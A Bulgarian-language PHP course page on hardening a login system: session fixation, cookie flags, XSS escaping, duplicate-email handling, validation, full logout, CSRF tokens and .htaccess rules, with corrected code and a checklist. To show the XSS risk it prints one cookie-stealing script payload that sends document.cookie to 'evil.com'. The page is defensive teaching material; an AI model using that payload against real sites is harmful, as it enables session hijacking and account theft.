# Сигурност на автентикацията — какво още липсва

В края на [урока за автентикация](01-автентикация.md) има таблица със заплахи и защити. Примерният код покрива част от тях, но не всички — таблицата казва какво *трябва* да се направи, а кодът е опростен, за да се вижда основният поток.

Тук минаваме през разликите. Всяка от тези дупки се използва реално.

## Какво обещава таблицата и какво прави кодът

| Заплаха | Таблицата казва | Примерът прави |
|---|---|---|
| SQL Injection | Prepared statements | ✅ да |
| Незащитени пароли | `password_hash()` / `password_verify()` | ✅ да |
| Сесийни атаки | `session_regenerate_id()` при логин | ❌ липсва |
| XSS | `htmlspecialchars()` при изход | ❌ не е показано |
| CSRF | Токени за формуляри | ❌ липсва |
| Директен достъп до класове | `.htaccess` | ❌ не е показано |
| Дублиран имейл | — | ❌ не се проверява |
| Валидация на вход | — | ⚠️ само `empty()` |

## 1. Session fixation — `session_regenerate_id()`

### Атаката

1. Атакуващият отваря сайта и получава session ID, например `abc123`.
2. Накарва жертвата да използва същия ID — на споделен компютър, през линк или с подправена cookie.
3. Жертвата влиза с имейл и парола. Сървърът записва `user_id` **в същата сесия** `abc123`.
4. Атакуващият вече държи валиден ID на влязъл потребител. Не му трябва паролата.

Проблемът е, че ID-то на сесията не се сменя при логин.

### Поправката

Веднага след успешна проверка на паролата:

```php
if ($success) {
    // Нов session ID; true изтрива стария запис на сървъра
    session_regenerate_id(true);

    Session::logUser(User::fromArray($userData));
}
```

Един ред. Старият ID става безполезен.

### И настройките на cookie-то

В `bootstrap.php`, **преди** `session_start()`:

```php
session_set_cookie_params([
    'httponly' => true,    // JavaScript не вижда cookie-то
    'samesite' => 'Lax',   // не се изпраща при заявки от чужд сайт
    'secure'   => false,   // true когато сайтът е на HTTPS
]);
session_start();
```

`httponly` спира кражба на сесията през XSS. `samesite` е първата защита срещу CSRF.

## 2. XSS при показване на данни

Регистрацията приема `name` и го записва както е. Ако някой се регистрира с име:

```
<script>fetch('http://evil.com?c=' + document.cookie)</script>
```

то това име ще се изпълни при всеки, който го види — освен ако не го екранираме при **показване**.

Важно: не чистим при запис, а екранираме при изход. Същите данни може да отиват в HTML, в JSON или в имейл, а правилата са различни за всяко.

### В PHP

```php
echo '<p>Здравей, ' . htmlspecialchars($user->getName(), ENT_QUOTES, 'UTF-8') . '</p>';
```

### В JavaScript

```js
// ❌ изпълнява HTML и скриптове
element.innerHTML = user.name;

// ✅ показва текста като текст
element.textContent = user.name;
```

> Същото предупреждение има и в урока за DOM манипулация. При автентикация е по-важно, защото открадната сесия означава откраднат акаунт.

## 3. Дублиран имейл при регистрация

Примерът прави `INSERT` без да провери дали имейлът вече съществува. Според базата се случва едно от двете:

- **Без ограничение в базата** — създават се два акаунта с един имейл. При логин `SELECT ... WHERE email = :email` връща първия ред и вторият потребител никога не може да влезе.
- **С `UNIQUE` ограничение** — `INSERT` хвърля изключение, което `set_exception_handler` в `bootstrap.php` връща като `500 Internal server error`. Потребителят вижда грешка на сървъра вместо „този имейл е зает".

### Поправката

Първо ограничението в базата:

```sql
ALTER TABLE users ADD UNIQUE KEY unique_email (email);
```

После обработка на грешката:

```php
try {
    $stmt->execute([
        'email' => $user->getEmail(),
        'password' => $user->getHashedPassword(),
        'name' => $user->getName(),
    ]);
} catch (PDOException $e) {
    if ($e->getCode() === '23000') {   // нарушено unique ограничение
        http_response_code(409);
        echo json_encode(['success' => false, 'error' => 'Този имейл вече е зает']);
        exit;
    }
    throw $e;
}
```

> **Защо не само `SELECT` преди `INSERT`?** Защото между проверката и записа може да мине друга заявка и пак се получават два реда. Ограничението в базата е единствената сигурна проверка. `SELECT` може да се добави за по-добро съобщение, но не замества `UNIQUE`.

## 4. Валидация на имейл и парола

`empty()` хваща само празно поле. Минава `asdf`, минава парола `1`.

```php
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Невалиден имейл']);
    exit;
}

if (mb_strlen($password) < 8) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Паролата трябва да е поне 8 символа']);
    exit;
}
```

`mb_strlen`, не `strlen` — `strlen` връща байтове и парола на кирилица се брои двойно.

Същите проверки трябва да са и в HTML формата (`type="email"`, `minlength="8"`), но само за удобство на потребителя. Проверката в браузъра се заобикаля с две кликвания в DevTools, затова валидацията на сървъра е задължителна.

## 5. Логаут, който наистина изчиства сесията

```php
case 'DELETE':
    session_destroy();
    echo json_encode(['success' => true]);
    break;
```

`session_destroy()` изтрива данните на сървъра, но **оставя cookie-то в браузъра** и не изчиства `$_SESSION` в текущата заявка. Пълното изчистване:

```php
case 'DELETE':
    $_SESSION = [];

    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(
            session_name(), '', time() - 42000,
            $params['path'], $params['domain'],
            $params['secure'], $params['httponly']
        );
    }

    session_destroy();
    echo json_encode(['success' => true]);
    break;
```

## 6. CSRF

Таблицата го отбелязва като „напреднало", но принципът е прост.

Ако потребителят е влязъл в нашия сайт, браузърът праща cookie-то при всяка заявка — включително при заявка, тръгнала от чужда страница. Чужд сайт може да подаде форма към нашия `user.php` и тя да се изпрати от името на жертвата.

Защитата е таен токен, който атакуващият не може да знае:

```php
// при показване на формата
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

```php
// в самата форма
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
```

```php
// при обработка
if (!isset($_POST['csrf_token']) ||
    !hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf_token'])) {
    http_response_code(403);
    echo json_encode(['error' => 'Invalid CSRF token']);
    exit;
}
```

`hash_equals`, не `===` — сравнява за постоянно време и не изтича информация за токена.

> `samesite => 'Lax'` от точка 1 спира повечето такива заявки и е много по-малко работа. Токенът остава правилният начин за важните действия.

## 7. Защита на файловете с класове

Таблицата казва `.htaccess` — `Deny from all`. Този синтаксис е от Apache 2.2. XAMPP идва с Apache 2.4, където е:

```apache
# classes/.htaccess
Require all denied
```

Така `localhost/classes/Db.php` връща 403 вместо да се опита да изпълни файла.

> По-добрият вариант е класовете да са извън `htdocs`, а в `htdocs` да стоят само файловете, които наистина се отварят от браузъра. За курса `.htaccess` е достатъчен.

## Поправеният логин, събран на едно място

```php
case 'POST':
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    if (!filter_var($email, FILTER_VALIDATE_EMAIL) || $password === '') {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'Невалидни данни']);
        exit;
    }

    $connection = (new Db())->getConnection();
    $stmt = $connection->prepare("SELECT * FROM users WHERE email = :email");
    $stmt->execute(['email' => $email]);
    $userData = $stmt->fetch();

    $success = $userData && password_verify($password, $userData['password']);

    if ($success) {
        session_regenerate_id(true);
        Session::logUser(User::fromArray($userData));
    }

    echo json_encode(['success' => $success]);
    break;
```

> Отговорът е един и същ при грешен имейл и при грешна парола. Ако различаваме двете, атакуващият може да провери кои имейли са регистрирани в системата.

## Контролен списък

- [ ] `session_regenerate_id(true)` при успешен логин
- [ ] `session_set_cookie_params` с `httponly` и `samesite` преди `session_start()`
- [ ] `htmlspecialchars()` при показване в PHP, `textContent` в JavaScript
- [ ] `UNIQUE` ограничение за имейл в базата и обработка на код `23000`
- [ ] `filter_var(..., FILTER_VALIDATE_EMAIL)` и минимална дължина на паролата
- [ ] Логаутът изчиства `$_SESSION`, cookie-то и сесията на сървъра
- [ ] CSRF токен със `hash_equals` за важните форми
- [ ] `Require all denied` в `classes/.htaccess`
- [ ] Еднакво съобщение при грешен имейл и грешна парола
